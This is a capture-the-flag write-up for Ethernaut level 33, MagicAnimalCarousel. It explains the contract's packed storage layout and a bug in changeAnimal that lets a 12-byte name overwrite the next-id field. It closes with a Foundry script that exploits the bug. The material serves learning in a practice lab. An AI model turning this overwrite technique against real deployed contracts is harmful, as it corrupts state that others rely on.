# Ethernaut Level 33 MagicAnimalCarousel

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    error AnimalNameTooLong();
    error CrateNotInitialized();

    constructor() {
        carousel[0] ^= 1 << 160;
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        uint256 crate = carousel[crateId];
        require(crate != 0, CrateNotInitialized());
        
        address owner = address(uint160(crate & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // Replace animal
            carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
        } else {
            // If no animal specified keep same animal but clear owner slot
            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

Our goal is to break the carousel. In this carousel, there are three masks defined: `animal_mask`, `next_id_mask`, and `owner_mask`. If we look closer, we can see that in a 32-byte slot, we have first 10 bytes for `animal_mask`, next 2 bytes for `next_id_mask`, and last 20 bytes for `owner_mask`, just like this:

```
0x FF...FF FFFF FF...FF
  |animal |next| owner | 
  |  10   |  2 |  20   | (bytes)
```

So we compress these three into one `carousel[i]`, and apply corresponding mask to it to get the data we want. 

In constructor, we did

```solidity
carousel[0] ^= 1 << 160;
```

Since `x ^ 0 = x`, `carousel[0] = 1 << 160`, it means the 2-byte next id (1) is left shifted to the correct storage area (left 11th - left 12th byte). 

In function `setAnimalAndSpin(string calldata animal)`, we first have to call `encodeAnimalName(animal)`, and in this function, we require that the name of the animal should be shorter than 12 bytes, and in this line:

```solidity
return uint256(bytes32(abi.encodePacked(animalName)) >> 160)
```

We have to first cast the `animalName` to `bytes32`, which puts the `animalName` to the **leftmost** bytes. Then we right shift it 20 bytes to make the 12-byte `animalName` sit at the **rightmost** bytes of a `uint256`. 

Now we go back to function `setAnimalAndSpin(string calldata animal)`. In this first line:

```solidity
uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
```

We right shift the animal name by 2 bytes to make it only 10 bytes long, which is going to fit in the compression scheme (leftmost 10 bytes is for animal name). For next line:

```solidity
uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;
```

We basically apply the corresponding mask to `carousel[currentCrateId]` to *extract* the next id from left 11th - left 12th byte, and right shift it 20 bytes to make it sit to the rightmost bytes. Now here comes the most challenging part:

```solidity
carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);
```

Let's divide it into different parts.

1. Part A: `(carousel[nextCrateId] & ~NEXT_ID_MASK)`. Since `carousel[nextCrateId]` is still 0, it makes this whole part 0.
2. Part B: `(encodedAnimal << 160 + 16)`: We left shift the 10-byte `encodedAnimal` by 22 bytes, so that the animal name can now fit in the compression scheme. 
3. Part C: `((nextCrateId + 1) % MAX_CAPACITY) << 160`: We add the 2-byte `nextCrateId` by 1, and calculate the mod of `MAX_CAPACITY` (0xffff) since we want a round-like carousel structure. At last, we left shift it by 20 bytes.
4. Part D: `uint160(msg.sender)`: This is the 20-byte address of the `msg.sender`, who would be the owner of this animal.

Now, `carousel[nextCrateId] = A ^ B | C | D = B | C | D`. So the final result look like this:

```
encodedAnimal (10 bytes) | nextCrateId (2 bytes) | owner (20 bytes)
```

In function `changeAnimal(string calldata animal, uint256 crateId)`, we can see that after we have the 12-byte `encodedAnimal`, we do not right shift it 2 bytes to make it only 10 bytes long. Instead, in this line:

```solidity
carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender)
```

We only left shift the 12-byte `encodedAnimal` by 20 bytes. So, if we call function `changeAnimal(string calldata animal, uint256 crateId)`, the last 2 bytes of the animal name is going to **cover** the 2-byte next id slot!

So the attack strategy is straightforward now: we change the name of an animal with the name whose last 2 bytes is 0xffff. Therefore, we can break this seemingly infinite carousel.

`MagicAnimalCarousel.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Script} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselScript is Script {
    MagicAnimalCarousel carousel = MagicAnimalCarousel(0xXXXXXXXXXXXX);

    function run() external {
        vm.startBroadcast();

        // currentCrateId = 1, animal: "Dragon", nextCrateId = 2, owner = msg.sender
        carousel.setAnimalAndSpin("Dragon");

        // Change animal in crateId 1 to hacker, nextCrateId = 65535 (0xffff)
        string memory hacker = string(abi.encodePacked(hex"10000000000000000000ffff"));
        carousel.changeAnimal(hacker, 1);

        // currentCrateId = 65535, animal: "Unicorn", nextCrateId = 0, owner = msg.sender
        carousel.setAnimalAndSpin("Unicorn");


        vm.stopBroadcast();
    }
}
```

Note that, inside hex"", we don't put 0x before the data.